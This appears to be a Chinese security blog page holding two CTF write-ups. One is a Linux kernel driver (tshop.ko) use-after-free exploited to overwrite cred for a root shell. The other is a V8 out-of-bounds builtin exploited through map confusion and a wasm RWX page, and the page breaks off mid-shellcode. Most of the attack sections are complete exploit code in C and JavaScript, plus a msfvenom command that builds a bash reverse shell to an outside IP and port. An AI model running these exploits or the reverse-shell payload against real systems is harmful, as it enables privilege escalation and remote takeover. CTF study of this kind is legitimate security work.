p1umer 202 May 9 00:09 boot.sh-rw-r--r-- 1 p1umer p1umer 4127776 May 9 00:09 bzImage-rw-r--r-- 1 p1umer p1umer 1514482 May 9 04:35 initramfs.img 将initramfs.img后缀改为.cpio后用ubuntu再次解压可以得到如下文件： 在poc文件夹内找到tshop.ko文件，使用IDA分析： 其中可以观察到，主要函数有三个： tshop-ioctl tshop-init tshop-exit 其中核心函数是 tshop-ioctl 需要重点分析，我们后面会具体分析这个函数 调试以及数据交互程序启动以及调试题目包含了一个 qemu 的启动脚本如下：12345678#!/bin/shqemu-system-x86_64 \\ -kernel bzImage \\ -nographic \\ -append &quot;rdinit=/linuxrc console=ttyS0 oops=panic panic=1&quot; \\ -m 128M \\ -cpu qemu64,smap,smep -initrd initramfs.img \\ -smp cores=1,threads=1 2&gt;/dev/null \\ 可以看到其中如果选择开启kaslr则需要在 -append 选项后面加上kaslr即可如果选择gdb调试，则需要加上：-gdb tcp::4869 -S （其中-S为挂起等待），对应的gdb脚本：123456789gdb \\ -ex &quot;add-auto-load-safe-path $(pwd)&quot; \\ -ex &quot;file vmlinux&quot; \\ -ex &apos;set arch i386:x86-64:intel&apos; \\ -ex &apos;target remote localhost:4869&apos; \\ -ex &apos;continue&apos; \\ -ex &apos;disconnect&apos; \\ -ex &apos;set arch i386:x86-64&apos; \\ -ex &apos;target remote localhost:4869&apos; EXP编写以及数据交互Kernel Pwn 如何和驱动模块进行交互呢？ 驱动处理预期流程是： 用户态调用驱动触发状态切换 进入内核态内核态响应用户请求 处理数据返回结果 切换回用户态 那么如何在用户态调用驱动呢？ 首先，对一个字符设备而言有如下结构体：12345678struct file_operations d_fops = { .owner = THIS_MODULE, .open = d_open, .read = d_read, .write = d_write, .ioctl = d_ioctl, .release = d_release, }; 该结构体展示了部分文件操作对应的函数指针。如读该设备时会调用d_open函数。从该结构体我们可以看出其实现了用户与内核驱动交互的接口，同时也就自然成为了内核攻击面之一。具体的调用方法为：12345int main(int argc, char *argv[]){ int fd = open(&quot;/dev/tshop&quot;,0); //debug(); ioctl(fd,MALLOC,0); } fd打开设备 通过ioctl进行具体的交互（或者该驱动注册的其他处理函数） 好了，可以实现和驱动模块的交互后，我们就可以用c语言来编写相应的exploit了。但是在这之前，我们先了解一下内核的一些保护模式 缓释机制mmap_min_addr指定用户进程通过mmap可使用的最小虚拟内存地址，以避免其在低地址空间产生映射导致安全问题。 kptr_restrict / dmesg_restrict在linux内核漏洞利用中常常使用commit_creds和prepare_kernel_cred来完成提权，它们的地址可以从/proc/kallsyms中读取。/proc/sys/kernel/kptr_restrict被默认设置为1以阻止通过这种方式泄露内核地址。dmesg_restrict限制非特权读dmesg（Restrict unprivileged access to kernel syslog） SMEP/SMAPSMEP(Supervisor Mode Execution Prevention，管理模式执行保护)和SMAP(Supervisor Mode Access Prevention，管理模式访问保护)，其作用分别是禁止内核执行用户空间的代码和禁止内核访问用户空间的数据。 程序分析前面提到，ida打开.ko文件得到如下内容：可以得到如下信息： 程序实现了kmalloc；kfree；edit1；edit2 程序维护了一个BUY_LIST用来存放kmen_cache_alloc分配的堆块 malloc的时候会把堆块写成特定值 两个edit函数改指针为固定值 有一个看起来没有参数的 kfree 等等，kfree没有参数？让我们仔细分析它：嗯，参数还是有的。但是这里面在释放完毕BUY_LIST里的堆块之后并没有清空，也就是说我们得到了一个UAF! 调试判断 Cred 结构体大小若要达到提权权限，则需要修改权限信息。kernel记录了线程的权限，更具体的，是用 cred 结构体记录的，每个线程中都有一个cred结构，这个结构保存了该进程的权限等信息（uid，gid等），如果能修改某个进程的cred，那么也就修改了这个进程的权限。所以我们需要得到Cred结构体大小，以便为后面的 exploit 拓展思路。 首先打开源码查看cred结构体定义12345678910111213141516171819202122232425262728293031323334353637struct cred { atomic_t usage;#ifdef CONFIG_DEBUG_CREDENTIALS atomic_t subscribers; /* number of processes subscribed */ void *put_addr; unsigned magic;#define CRED_MAGIC 0x43736564#define CRED_MAGIC_DEAD 0x44656144#endif uid_t uid; /* real UID of the task */ gid_t gid; /* real GID of the task */ uid_t suid; /* saved UID of the task */ gid_t sgid; /* saved GID of the task */ uid_t euid; /* effective UID of the task */ gid_t egid; /* effective GID of the task */ uid_t fsuid; /* UID for VFS ops */ gid_t fsgid; /* GID for VFS ops */ unsigned securebits; /* SUID-less security management */ kernel_cap_t cap_inheritable; /* caps our children can inherit */ kernel_cap_t cap_permitted; /* caps we&apos;re permitted */ kernel_cap_t cap_effective; /* caps we can actually use */ kernel_cap_t cap_bset; /* capability bounding set */#ifdef CONFIG_KEYS unsigned char jit_keyring; /* default keyring to attach requested * keys to */ struct key *thread_keyring; /* keyring private to this thread */ struct key *request_key_auth; /* assumed request_key authority */ struct thread_group_cred *tgcred; /* thread-group shared credentials */#endif#ifdef CONFIG_SECURITY void *security; /* subjective LSM security */#endif struct user_struct *user; /* real user ID subscription */ struct user_namespace *user_ns; /* cached user-&gt;user_ns */ struct group_info *group_info; /* supplementary groups for euid/fsgid */ struct rcu_head rcu; /* RCU deletion hook */}; emmm，直接判断大小貌似有点困难，调试一下好了。注意,由于系统开启了kptr_restrict，我们无法看到一些地址信息，所以我们需要关闭。【关闭 kptr_restrict】：修改解压后的 /etc/.init/rcS 文件中的echo 1 &gt; /proc/sys/kernel/kptr_restrict 为 echo 0 &gt; /proc/sys/kernel/kptr_restrict 这时候就可以得到一些我们感兴趣的地址：【kmem_cache_alloc】：cat /proc/kallsyms |grep kmem_cache_alloc【kfree】：cat /proc/kallsyms |grep kfree【prepare_cred】：cat /proc/kallsyms | grep prepare_cred【tshop的bss地址】：cat /sys/module/tshop/sections/.bss 另外，我们在用户态执行fork函数的时候，可以调用内核prepare_cred来创建cred结构体提供给新进程的新线程。 所以我们编写一个简单的demo.c:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/* * main.c * Copyright (C) 2019 P1umer &lt;cz18811105578@gmail.com&gt; * */// gcc exp.c -o exp --static -lpthread#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/mman.h&gt;#include &lt;poll.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;stdlib.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;pthread.h&gt;#include &lt;poll.h&gt;#include &lt;linux/prctl.h&gt;#include &lt;stdint.h&gt;#define MALLOC 0x271A#define FREE 0x2766#define EDIT1 0x1A0A#define EDIT2 0x22B8 pid_t pid;void debug(){ getchar();}int main(int argc, char *argv[]){ int fd = open(&quot;/dev/tshop&quot;,0); debug(); ioctl(fd,MALLOC,0); fork()；} 【编译】：gcc exp.c -o exp --static -lpthread【打包】：打包命令为：find . | cpio -o --format=newc &gt; ../initramfs.img 值得注意的是，我们因为调试的是内核，在内核中有很多的kmem_cache_alloc &amp;&amp; prepare_cred &amp;&amp; kfree 调用，因此我们只希望在 poc 调用内核这些函数的时候进行下断调试，因此getchar()是必要的。 启动 gdb+qemu 调试，断在 prepare_cred：调用了0xffffffff810d3251，查看函数名：12$ cat /proc/kallsyms | grep &quot;ffffffff810d3251&quot; ffffffff810d3251 T kmem_cache_alloc 可以看到 prepare_cred 函数实际调用了 kmem_cache_alloc 来申请cred的空间，大小通过 $rsi 传参，为 0xd0。惊奇的发现，居然和我们ioctl操作中kmem_cache_alloc申请的大小一致 :) Exploit上面提到有了一个UAF并且cred结构体大小和驱动malloc操作申请的堆块大小一致，那么接下来的事情就好办多了，在这之前先了解一下kernel里面的memory_management： 【+】http://www.wowotech.net/memory_management/247.html slab分配器的管理手段类似于 Glibc 中的 FastbinY。如果free链表内的chunk大小和该内核版本的 cred 结构体大小相同，那么会把free链表中的chunk解链返回给 cred。 于是我们就可以通过doublefree来进行提权： doublefree 得到cred结构体后通过两次malloc修改cred结构体中的值为特定的值（上面的ida分析有提到），恰好可以达到 root 要求 这个地方遇到了一点困难：由于驱动的堆内存和内核的内存是共享的，在得到 cred 的同时会把cred的信息写入该内存，也就是说 在我们准备doublefree之前： 把cred写入最末尾的chunk 内核下一次申请的时候就会申请到非法地址，PANIC!但是如果我们在系统申请非法地址之前讲free链表扩充到足够大是不是就可以缓解呢系统迟一点申请到非法地址呢? 我们来试一试：编写exp.c(ugly code):12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394/* * main.c * Copyright (C) 2019 P1umer &lt;cz18811105578@gmail.com&gt; * */// gcc exp.c -o exp --static -lpthread#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/mman.h&gt;#include &lt;poll.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;stdlib.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;pthread.h&gt;#include &lt;poll.h&gt;#include &lt;linux/prctl.h&gt;#include &lt;stdint.h&gt;#define MALLOC 0x271A#define FREE 0x2766#define EDIT1 0x1A0A#define EDIT2 0x22B8 pid_t pid;void debug(){ getchar();}int main(int argc, char *argv[]){ int fd = open(&quot;/dev/tshop&quot;,0); debug(); ioctl(fd,MALLOC,0); ioctl(fd,MALLOC,1); ioctl(fd,MALLOC,2); ioctl(fd,MALLOC,3); ioctl(fd,MALLOC,4); ioctl(fd,MALLOC,5); ioctl(fd,MALLOC,6); ioctl(fd,MALLOC,7); ioctl(fd,MALLOC,8); ioctl(fd,MALLOC,9); ioctl(fd,MALLOC,10); ioctl(fd,MALLOC,11); ioctl(fd,MALLOC,12); ioctl(fd,MALLOC,13); ioctl(fd,MALLOC,14); ioctl(fd,MALLOC,15); ioctl(fd,MALLOC,16); ioctl(fd,MALLOC,17); ioctl(fd,FREE,17); ioctl(fd,FREE,16); ioctl(fd,FREE,17); pid=fork(); if(pid==0){ printf(&quot;[+] root?&quot;); system(&quot;whoami&quot;); }else{ ioctl(fd,MALLOC,16); ioctl(fd,MALLOC,17);//cred==0 ioctl(fd,FREE,0); ioctl(fd,FREE,1); ioctl(fd,FREE,2); ioctl(fd,FREE,3); ioctl(fd,FREE,4); ioctl(fd,FREE,5); ioctl(fd,FREE,6); ioctl(fd,FREE,7); ioctl(fd,FREE,8); ioctl(fd,FREE,9); ioctl(fd,FREE,10); ioctl(fd,FREE,11); ioctl(fd,FREE,12); ioctl(fd,FREE,13); ioctl(fd,FREE,14); ioctl(fd,FREE,15); }} 输出结果： 貌似已经提权成功了。这种方法确实奏效，但是当我多执行一些指令的时候内核又会panic :(怎么办呢？ Exploit 加固由于panic的核心原因在于把 cred info 当作地址来申请堆块，那么在这个方向思考的话，其实可以通过一个free的写指针操作把 cred info 覆盖为一个有效的 chunk 地址，也就是free链表的尾 chunk 地址。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101/* * main.c * Copyright (C) 2019 P1umer &lt;cz18811105578@gmail.com&gt; */// gcc exp.c -o exp --static -lpthread#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/mman.h&gt;#include &lt;poll.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;stdlib.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;pthread.h&gt;#include &lt;poll.h&gt;#include &lt;linux/prctl.h&gt;#include &lt;stdint.h&gt;#define MALLOC 0x271A#define FREE 0x2766#define EDIT1 0x1A0A#define EDIT2 0x22B8 pid_t pid;void debug(){ getchar();}int main(int argc, char *argv[]){ int fd = open(&quot;/dev/tshop&quot;,0); debug(); ioctl(fd,MALLOC,0); ioctl(fd,MALLOC,1); ioctl(fd,MALLOC,2); ioctl(fd,MALLOC,3); ioctl(fd,MALLOC,4); ioctl(fd,MALLOC,5); ioctl(fd,MALLOC,6); ioctl(fd,MALLOC,7); ioctl(fd,MALLOC,8); ioctl(fd,MALLOC,9); ioctl(fd,MALLOC,10); ioctl(fd,MALLOC,11); ioctl(fd,MALLOC,12); ioctl(fd,MALLOC,13); ioctl(fd,MALLOC,14); ioctl(fd,MALLOC,15); ioctl(fd,MALLOC,16); ioctl(fd,MALLOC,17); ioctl(fd,FREE,17); ioctl(fd,FREE,16); ioctl(fd,FREE,17); pid=fork(); if(pid==0){ sleep(1); printf(&quot;[+] root&quot;); system(&quot;whoami&quot;); system(&quot;/bin/sh&quot;); }else{ printf(&quot;[+] shell close&quot;); ioctl(fd,FREE,17); ioctl(fd,MALLOC,17); ioctl(fd,MALLOC,16); ioctl(fd,MALLOC,17);//cred==0 ioctl(fd,FREE,0); ioctl(fd,FREE,1); ioctl(fd,FREE,2); ioctl(fd,FREE,3); ioctl(fd,FREE,4); ioctl(fd,FREE,5); ioctl(fd,FREE,6); ioctl(fd,FREE,7); ioctl(fd,FREE,8); ioctl(fd,FREE,9); ioctl(fd,FREE,10); ioctl(fd,FREE,11); ioctl(fd,FREE,12); ioctl(fd,FREE,13); ioctl(fd,FREE,14); ioctl(fd,FREE,15); sleep(100); }} 主进程通过 UAF 再次把 chunk17 free 了一次，复写里面的Cred info 为 chunk16 的地址，然后再次申请堆块把链表恢复为原状态。同时在父进程中加了sleep函数提高稳定性。 这时候已经得到了稳定的 root shell :) 更多的思考还有一种更为精简的解法, 从一开始没有考虑 doublefree ：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#define DEL 0x2766#define SET_ZEGE 0x22B8 // 0x123456789ABCDEF0LL#define ALLOC 0x271A#define SET_JIGE 0x1A0A // 0xFEDCBA987654321LLint main() { int fd = open(&quot;/dev/tshop&quot;, 0); size_t heap_addr , kernel_addr,mod_addr; if (fd &lt; 0) { printf(&quot;[-] bad open /dev/tshop\\n&quot;); exit(-1); } ioctl(fd, ALLOC, 0); ioctl(fd, ALLOC, 1); ioctl(fd, DEL, 0); ioctl(fd, DEL, 1); int pid=fork(); ioctl(fd, DEL, 1); ioctl(fd, ALLOC, 3); //getchar(); //getchar(); if (pid &lt; 0) { puts(&quot;[-] fork error!&quot;); exit(0); } else if (pid == 0) { if (getuid() == 0) { puts(&quot;[+] root&quot;); system(&quot;cat /home/sunichi/flag&quot;); system(&quot;id&quot;); system(&quot;/bin/sh&quot;) exit(0); } } else { sleep(30); puts(&quot;[+] parent exit&quot;); }} 具体思路： alloc并free掉两块内存，使他们接入slab cache链表的尾部，这里暂且给它编号为chunk0和chunk1 由于采用FIFO算法，此时slab缓存的单向链表最尾端的chunk为chunk1，而且第一个8字节存储的是指向chunk0的指针，当ALLOC新cache时，将优先取出chunk1分配给进程。 fork一个子进程，这个子进程的cred结构体会复用此前我们free掉的内存块（chunk1）此时，堆块中的cred如下： 我们的目标是将cred的id位置零，首先就需要再次拿到cred所在堆块（chunk1） free并立即进行alloc操作，chunk1就会挂到cache链上后再次被申请回来。 由于ALLOC操作伴随着所在堆块数据的初始化，于是我们不用再有多余的操作便能将cred结构体uid及gid位置零。此时子进程就已成功提权（root）","link":"/2019/05/30/Linux Kernel 初探/"},{"title":"StarCTF OOB writeup","text":"Intro: 一道 StarCTF 上的 V8 引擎 Writeup 写在前面借着 *CTF 的机会更新一篇有关 v8 引擎漏洞利用相关的博客。前不久刚刚结束的Star CTF上拿到了 OOB 的三血，下面为 WriteUp. 分析patch123456789101112131415161718192021+BUILTIN(ArrayOob){+ uint32_t len = args.length();+ if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();//check len&lt;=2,else return undefine+ Handle&lt;JSReceiver&gt; receiver;+ ASSIGN_RETURN_FAILURE_ON_EXCEPTION(+ isolate, receiver, Object::ToObject(isolate, args.receiver()));+ Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);+ FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());+ uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());+ if(len == 1){+ //read+ return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));+ }else{+ //write+ Handle&lt;Object&gt; value;+ ASSIGN_RETURN_FAILURE_ON_EXCEPTION(+ isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));+ elements.set(length,value-&gt;Number());+ return ReadOnlyRoots(isolate).undefined_value();+ }+} 漏洞很明显，注册的buildin函数提供了一个单位的数组越界读写权限。 原语:12read =&gt; arr.oob() // return arr[arr.length]write =&gt; arr.oob(xxxx)//arr[arr.length]=xxxx 内存示例12345678[ class / map ] -&gt; ... ; 指向内部类[ properties ] -&gt; [empty array][ elements ] -&gt; [empty array] ; 数值类型名称的属性[ reserved #1 ] -\\[ reserved #2 ] |[ reserved #3 ] }- in object properties,即预分配的内存空间............... |[ reserved #N ] -/ 其中 map 字段代表了 V8 针对属性访问的隐藏类，其中的资料可以参考: [+] https://segmentfault.com/a/1190000008188648 利用思路 考虑复写 map 进行对象的 Type Confusion，从而针对Array进行map伪造，通过obj的map的来访问arr的length字段，从而达到数组长度的改写。 针对 smi 的 arr 进行了map伪造从而修改length，紧接着利用该溢出arr构造了double类型arr进行任意地址读写原语的构造(wasm一把梭)。 具体的相关偏移以及GC的影响需要gdb调试。 其中，我们尝试了nc反弹，bash反弹，本地以及自己搭建的服务器均成功利用。 shellcode 构造1msfvenom -p linux/x64/exec CMD=\"bash -c '/get_flag &amp;&gt;/dev/tcp/39.106.1.205/23333 0&gt;&amp;1'\" -f python -b '\\x00\\x0b' exploit123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422function hex(b) { return ('0' + b.toString(16)).substr(-2);}// Return the hexadecimal representation of the given byte array.function hexlify(bytes) { var res = []; for (var i = 0; i &lt; bytes.length; i++) res.push(hex(bytes[i])); return res.join('');}// Return the binary data represented by the given hexdecimal string.function unhexlify(hexstr) { if (hexstr.length % 2 == 1) throw new TypeError(\"Invalid hex string\"); var bytes = new Uint8Array(hexstr.length / 2); for (var i = 0; i &lt; hexstr.length; i += 2) bytes[i/2] = parseInt(hexstr.substr(i, 2), 16); return bytes;}function hexdump(data) { if (typeof data.BYTES_PER_ELEMENT !== 'undefined') data = Array.from(data); var lines = []; for (var i = 0; i &lt; data.length; i += 16) { var chunk = data.slice(i, i+16); var parts = chunk.map(hex); if (parts.length &gt; 8) parts.splice(8, 0, ' '); lines.push(parts.join(' ')); } return lines.join('\\n');}// Simplified version of the similarly named python module.var Struct = (function() { // Allocate these once to avoid unecessary heap allocations during pack/unpack operations. var buffer = new ArrayBuffer(8); var byteView = new Uint8Array(buffer); var uint32View = new Uint32Array(buffer); var float64View = new Float64Array(buffer); return { pack: function(type, value) { var view = type; // See below view[0] = value; return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT); }, unpack: function(type, bytes) { if (bytes.length !== type.BYTES_PER_ELEMENT) throw Error(\"Invalid bytearray\"); var view = type; // See below byteView.set(bytes); return view[0]; }, // Available types. int8: byteView, int32: uint32View, float64: float64View };})();//// Tiny module that provides big (64bit) integers.//// Copyright (c) 2016 Samuel Groß//// Requires utils.js//// Datatype to represent 64-bit integers.//// Internally, the integer is stored as a Uint8Array in little endian byte order.function Int64(v) { // The underlying byte array. var bytes = new Uint8Array(8); switch (typeof v) { case 'number': v = '0x' + Math.floor(v).toString(16); case 'string': if (v.startsWith('0x')) v = v.substr(2); if (v.length % 2 == 1) v = '0' + v; var bigEndian = unhexlify(v, 8); bytes.set(Array.from(bigEndian).reverse()); break; case 'object': if (v instanceof Int64) { bytes.set(v.bytes()); } else { if (v.length != 8) throw TypeError(\"Array must have excactly 8 elements.\"); bytes.set(v); } break; case 'undefined': break; default: throw TypeError(\"Int64 constructor requires an argument.\"); } // Return a double whith the same underlying bit representation. this.asDouble = function() { // Check for NaN if (bytes[7] == 0xff &amp;&amp; (bytes[6] == 0xff || bytes[6] == 0xfe)) throw new RangeError(\"Integer can not be represented by a double\"); return Struct.unpack(Struct.float64, bytes); }; // Return a javascript value with the same underlying bit representation. // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000) // due to double conversion constraints. this.asJSValue = function() { if ((bytes[7] == 0 &amp;&amp; bytes[6] == 0) || (bytes[7] == 0xff &amp;&amp; bytes[6] == 0xff)) throw new RangeError(\"Integer can not be represented by a JSValue\"); // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern. this.assignSub(this, 0x1000000000000); var res = Struct.unpack(Struct.float64, bytes); this.assignAdd(this, 0x1000000000000); return res; }; // Return the underlying bytes of this number as array. this.bytes = function() { return Array.from(bytes); }; // Return the byte at the given index. this.byteAt = function(i) { return bytes[i]; }; // Return the value of this number as unsigned hex string. this.toString = function() { return '0x' + hexlify(Array.from(bytes).reverse()); }; // Basic arithmetic. // These functions assign the result of the computation to their 'this' object. // Decorator for Int64 instance operations. Takes care // of converting arguments to Int64 instances if required. function operation(f, nargs) { return function() { if (arguments.length != nargs) throw Error(\"Not enough arguments for function \" + f.name); for (var i = 0; i &lt; arguments.length; i++) if (!(arguments[i] instanceof Int64)) arguments[i] = new Int64(arguments[i]); return f.apply(this, arguments); }; } // this = -n (two's complement) this.assignNeg = operation(function neg(n) { for (var i = 0; i &lt; 8; i++) bytes[i] = ~n.byteAt(i); return this.assignAdd(this, Int64.One); }, 1); // this = a + b this.assignAdd = operation(function add(a, b) { var carry = 0; for (var i = 0; i &lt; 8; i++) { var cur = a.byteAt(i) + b.byteAt(i) + carry; carry = cur &gt; 0xff | 0; bytes[i] = cur; } return this; }, 2); // this = a - b this.assignSub = operation(function sub(a, b) { var carry = 0; for (var i = 0; i &lt; 8; i++) { var cur = a.byteAt(i) - b.byteAt(i) - carry; carry = cur &lt; 0 | 0; bytes[i] = cur; } return this; }, 2);}// Constructs a new Int64 instance with the same bit representation as the provided double.Int64.fromDouble = function(d) { var bytes = Struct.pack(Struct.float64, d); return new Int64(bytes);};// Return -n (two's complement)function Neg(n) { return (new Int64()).assignNeg(n);}// Return a + bfunction Add(a, b) { return (new Int64()).assignAdd(a, b);}// Return a - bfunction Sub(a, b) { return (new Int64()).assignSub(a, b);}// Some commonly used numbers.Int64.Zero = new Int64(0);Int64.One = new Int64(1);function gc(){ /*fill-up the 1MB semi-space page, force V8 to scavenge NewSpace.*/ for(var i=0;i&lt;((1024 * 1024)/0x10);i++) { var a= new String(); }}function give_me_a_clean_newspace(){ /*force V8 to scavenge NewSpace twice to get a clean NewSpace.*/ gc() gc()}let f64 = new Float64Array(1);let u32 = new Uint32Array(f64.buffer);function d2u(v) { f64[0] = v; return u32;}function u2d(lo, hi) { u32[0] = lo; u32[1] = hi; return f64;}function Hex(lo, hi) { if( lo == 0 ) { return (\"0x\" + hi.toString(16) + \"00000000\"); } if( hi == 0 ) { return (\"0x\" + lo.toString(16)); } return (\"0x\" + hi.toString(16) + lo.toString(16));}function view(array, lim) { for(let i = 0; i &lt; lim; i++) { t = array[i]; console.log(\"[\" + i + \"] : \" + hex(d2u(t)[0], d2u(t)[1])); }}var GlobalArr=[];var GlobalObjs=[];var GlobalBuffer=[];var LengthOffset=0;var LengthToBe=(new Int64(\"7fffffff00000000\")).asDouble()var oob_arr = null;let victim_obj = null;let victimobj_obj_offset_of_OOBARR = null;let victim_buf = null;let victimbuf_backingstore_pointer_offset_of_OOBARR = null;let rwaddr=nullfunction exploit(){ let wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 7, 1, 96, 2, 127, 127, 1, 127, 3, 2, 1, 0, 4, 4, 1, 112, 0, 0, 5, 3, 1, 0, 1, 7, 21, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 8, 95, 90, 51, 97, 100, 100, 105, 105, 0, 0, 10, 9, 1, 7, 0, 32, 1, 32, 0, 106, 11]); let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {}); let f = wasm_mod.exports._Z3addii; give_me_a_clean_newspace() let array=new Array(10) let obj={a:1,b:2,c:3,d:4,e:5}; let array2=new Array(10) let obj2=new Array(10); obj2[0]=1 let victim=new Array(10) victim[0]=1.1; //%DebugPrint(obj); //%DebugPrint(obj2); //console.log(\"cz1\") //console.log(\"============================\") console.log(\"[+]leak the first map: \",Int64.fromDouble(array.oob())) let map1=new Int64(Int64.fromDouble(array.oob())) console.log(\"[+]leak the second map: \",Int64.fromDouble(array2.oob())); let map2=new Int64(Int64.fromDouble(array2.oob())) //overwrite the array2.map array2.oob(map1.asDouble()) //console.log(obj2.a) //overwrite the length obj2.a=0x1000; //%DebugPrint(obj2) //return the map2 array2.oob(map2.asDouble()) console.log(obj2.length); //%DebugPrint(obj2); //%DebugPrint(victim) obj2[13]=0x2333; //%DebugPrint(victim) //console.log(\"cz2\") let leaked = [0xdada, 0xadad, f, {}, 1.1]; let ab = new ArrayBuffer(0x50); let idx = 0; let wasm_idx = 0; for(let i = 0; i &lt; 0x1000; i++) { value = d2u(victim[i]); if (value[1] === 0xdada) { t = d2u(victim[i + 1]); if (t[1] === 0xadad){ wasm_idx = i + 2; } } if (value[0] === 0x50) { idx = i; console.log(\"[-] find index : \" + idx); break; } } // change ArrayBuffer's byteLength property tt = u2d(0x2000, 0); eval(`victim[${idx}] = ${tt}`); //%DebugPrint(ab); //view(victim, 100); let wasm_obj_lo = d2u(victim[wasm_idx])[0]; let wasm_obj_hi = d2u(victim[wasm_idx])[1]; %DebugPrint(f) console.log(\"[-] wasm object : \" + hex(wasm_obj_lo, wasm_obj_hi)); tt = u2d(wasm_obj_lo - 1, wasm_obj_hi); eval(`victim[${idx + 1}] = ${tt}`); let dv = new DataView(ab); // gdb SHARED_FUNCTION_INFO_TYPE_lo = dv.getUint32(0x18, true); SHARED_FUNCTION_INFO_TYPE_hi = dv.getUint32(0x18 + 4, true); // SHARED_FUNCTION_INFO_TYPE_lo = dv.getUint32(0x10, true); // SHARED_FUNCTION_INFO_TYPE_hi = dv.getUint32(0x10 + 4, true); console.log(\"[-] SHARED_FUNCTION_INFO_TYPE : \" + Hex(SHARED_FUNCTION_INFO_TYPE_lo, SHARED_FUNCTION_INFO_TYPE_hi)); tt = u2d(SHARED_FUNCTION_INFO_TYPE_lo - 1, SHARED_FUNCTION_INFO_TYPE_hi); eval(`victim[${idx + 1}] = ${tt}`); WASM_EXPORTED_FUNCTION_DATA_TYP_lo = dv.getUint32(0x8, true); WASM_EXPORTED_FUNCTION_DATA_TYP_hi = dv.getUint32(0x8+4, true); console.log(\"[-] WASM_EXPORTED_FUNCTION_DATA_TYPE : \" + Hex(WASM_EXPORTED_FUNCTION_DATA_TYP_lo, WASM_EXPORTED_FUNCTION_DATA_TYP_hi)); tt = u2d(WASM_EXPORTED_FUNCTION_DATA_TYP_lo - 1, WASM_EXPORTED_FUNCTION_DATA_TYP_hi); eval(`victim[${idx + 1}] = ${tt}`); WASM_INSTANCE_TYPE_lo = dv.getUint32(0x10, true); WASM_INSTANCE_TYPE_hi = dv.getUint32(0x10+4, true); console.log(\"[-] WASM_INSTANCE_TYPE : \" + Hex(WASM_INSTANCE_TYPE_lo, WASM_INSTANCE_TYPE_hi)); tt = u2d(WASM_INSTANCE_TYPE_lo - 1, WASM_INSTANCE_TYPE_hi); eval(`victim[${idx + 1}] = ${tt}`); // use gdb_debug to gain the specifi coffset rwx_lo = dv.getUint32(0x88, true); rwx_hi = dv.getUint32(0x88+4, true); // rwx_lo = dv.getUint32(0xd0, true); // rwx_hi = dv.getUint32(0xd0+4, true); console.log(\"[-] rwx page : \" + Hex(rwx_lo, rwx_hi)); //%SystemBreak() tt = u2d(rwx_lo, rwx_hi); eval(`victim[${idx + 1}] = ${tt}`); var shellcode = [0xbb48c031, 0x91969dd1, 0xff978cd0, 0x53dbf748, 0x52995f54, 0xb05e5457, 0x50f3b]; //var shellcode = [0x48c93148, 0xfff3e981, 0x8d48ffff, 0xffffef05, 0x23bb48ff, 0x47e51aa4, 0x4877a006, 0x48275831, 0xfffff82d, 0x49f4e2ff, 0xf7c429f, 0x4a158fbd, 0x2f9635ca, 0xaa3ff306, 0x24c87243, 0xaa3fa006, 0x7a0d4842, 0x4d77a006, 